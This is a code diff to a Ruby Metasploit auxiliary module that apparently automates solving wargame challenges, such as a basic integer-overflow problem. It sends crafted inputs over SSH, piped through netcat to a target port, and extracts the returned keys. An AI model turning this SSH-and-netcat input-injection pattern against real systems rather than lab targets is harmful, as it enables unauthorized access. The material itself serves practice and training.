@@ -67,11 +67,11 @@ class Metasploit3 < Msf::Auxiliary
 		problems = {
 			1 => [
 				'Connect to server! easy start',
-				"echo '#{account}';"
+				"echo '#{account}'"
 			],
 			2 => [
 				'[Basic] Integer Over Flow',
-				"echo 2147478598; echo 2147478598;"
+				"echo 2147478598; echo 2147478598"
 			]
 		}
 
@@ -87,11 +87,11 @@ class Metasploit3 < Msf::Auxiliary
 
 		begin
 			Net::SSH.start(whost, account, :password => password) do |ssh|
-				ssh.exec!("{ #{cmd} sleep 1; } | telnet #{thost} #{tport} | grep 'key: ' | cut -d ' ' -f 2") do |ch2, stream, data|
+				ssh.exec!("{ #{cmd} ; } | nc -v #{thost} #{tport} | grep 'key: ' | cut -d ' ' -f 2") do |ch2, stream, data|
 					if stream == :stdout
 						puts "Your key is: \e[1;33m#{data}\e[m"
 					end
-					if stream == :stderr && data =~ /Unable to connect to remote host/
+					if stream == :stderr && data =~ /Connection refused/
 						puts "\e[1;31mThe target port #{thost}:#{tport} is not opened."
 						puts "Try click the \e[43mstart\e[m\e[1;31m or \e[43mrestart\e[m\e[1;31m button on the website.\e[m"
 					end
